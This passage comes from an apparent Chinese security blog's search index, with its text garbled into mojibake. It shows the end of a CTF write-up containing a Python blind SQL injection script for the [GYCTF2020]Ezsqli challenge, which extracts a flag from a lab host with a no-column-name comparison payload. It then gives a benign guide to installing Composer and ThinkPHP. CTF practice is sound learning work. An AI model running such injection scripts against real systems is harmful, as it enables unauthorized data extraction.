´å‡ºæ¥çš„<strong>1</strong>çš„æ—¶å€™ï¼Œæ˜¯æ¯”æ­£ç¡®å­—ç¬¦è¦<strong>å¤§1</strong>çš„ï¼Œæ‰€ä»¥åœ¨ç¼–å†™è„šæœ¬æ—¶ï¼Œæˆ‘ä»¬è¦**-1**æ‰èƒ½å¾—åˆ°æ­£ç¡®å­—ç¬¦ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨è®¾ç½®å¾ªç¯ä¸Šé™æ—¶asciiå€¼è¦å¤§äºæˆ–è€…ç­‰äº<strong>127</strong></p><p><img src="https://img-blog.csdnimg.cn/010a3d165be443bebe8e9c49885e9f2d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è„šæœ¬å¦‚ä¸‹ï¼š([GYCTF2020]Ezsqli)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://e0e4d9bf-1f0b-435c-aedf-6d1aa33856ce.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(j)</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">        re=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ä¸€äº›å§¿åŠ¿æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ— åˆ—åæ³¨å…¥ </tag>
            
            <tag> å§¿åŠ¿æ€»ç»“ </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowsä¸‹phpstudyå®‰è£…composeråŠå…¶thinkphpå„ç‰ˆæœ¬</title>
      <link href="/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/"/>
      <url>/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>å­¦ä¹ thinphpï¼Œåœ¨æ­å»ºç¯å¢ƒæ˜¯é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ•…æ­¤å†™ä¸‹ã€‚</p><h2 id="ç¼˜ç”±ï¼š"><a href="#ç¼˜ç”±ï¼š" class="headerlink" title="ç¼˜ç”±ï¼š"></a>ç¼˜ç”±ï¼š</h2><p>ç”±äºå®˜ç½‘ä¸Šthinkphpç‰ˆæœ¬åªæä¾›åˆ°5.0.24 ï¼Œè€Œéœ€è¦ä¸‹è½½çš„ç‰ˆæœ¬ä¸º5.1åŠå…¶ä»¥ä¸Šç‰ˆæœ¬</p><p><img src="https://img-blog.csdnimg.cn/3012b801aea94e95809f73d32284aea0.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ä¸€ã€composerçš„ä¸‹è½½å®‰è£…"><a href="#ä¸€ã€composerçš„ä¸‹è½½å®‰è£…" class="headerlink" title="ä¸€ã€composerçš„ä¸‹è½½å®‰è£…"></a>ä¸€ã€composerçš„ä¸‹è½½å®‰è£…</h2><p>æˆ‘ä»¬éœ€è¦åˆ©ç”¨<strong>composer</strong>æ¥å®‰è£…<strong>thinkphp</strong>é«˜ç‰ˆæœ¬</p><p><img src="https://img-blog.csdnimg.cn/da4f2780b3004b54a8422e423fa1dcf6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥åˆ°phpstudy<strong>ç½‘ç«™</strong>ç•Œé¢ï¼Œç›´æ¥ç‚¹å‡»composerå³å¯ä¸‹è½½</p><p>ä¸‹è½½ä¹‹åï¼Œä½†æ˜¯æ³¨æ„ï¼Œè¿™é‡Œä¸‹è½½çš„æ˜¯<strong>1.8.5</strong>ç‰ˆæœ¬çš„composer</p><p><img src="https://img-blog.csdnimg.cn/88e77dff8c25486ab169dc7b4d9cfb99.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€ä»¥ä¸‹è½½å®Œä¹‹åï¼Œåˆ©ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å‡çº§composer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer selfupdate</span><br></pre></td></tr></table></figure><h2 id="äºŒã€åˆ©ç”¨composerå®‰è£…thinkphp"><a href="#äºŒã€åˆ©ç”¨composerå®‰è£…thinkphp" class="headerlink" title="äºŒã€åˆ©ç”¨composerå®‰è£…thinkphp"></a>äºŒã€åˆ©ç”¨composerå®‰è£…thinkphp</h2><p>æ‰“å¼€composerå®˜ç½‘ï¼š<a href="https://www.phpcomposer.com/">Composer ä¸­æ–‡ç½‘</a>ï¼Œç‚¹å‡»<a href="https://packagist.org/">Packagist è‹±æ–‡å®˜ç½‘</a>ï¼Œæ‰¾åˆ°ä½ è¦ä¸‹è½½çš„ç‰ˆæœ¬</p><p><img src="https://img-blog.csdnimg.cn/5277d1b7e7a5429c975382022f8a0c32.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_12,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¤åˆ¶ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ccf6dc84a19a4431b2ad8ca330872edc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨å‘½ä»¤è¡Œä¸­é”®å…¥ä»¥ä¸‹å‘½ä»¤å³å¯å®‰è£…æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=(è¾“å…¥ä½ æƒ³è¦ä¸‹è½½çš„ç‰ˆæœ¬) tp5.1(æ–‡ä»¶å¤¹çš„åç§°)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a1948438363645a7ab952b5e218dffd3.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æˆåŠŸåä¼šåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹tp5.1</p><p><img src="https://img-blog.csdnimg.cn/bc13502962ee4d1e90aabed03580724c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹‹åè®¿é—®ä¾¿å¯</p><p><img src="https://img-blog.csdnimg.cn/6031cfab5f404e48a2db35c1e6258760.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶å®‰è£…åŠç¯å¢ƒæ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è½¯ä»¶å®‰è£… </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
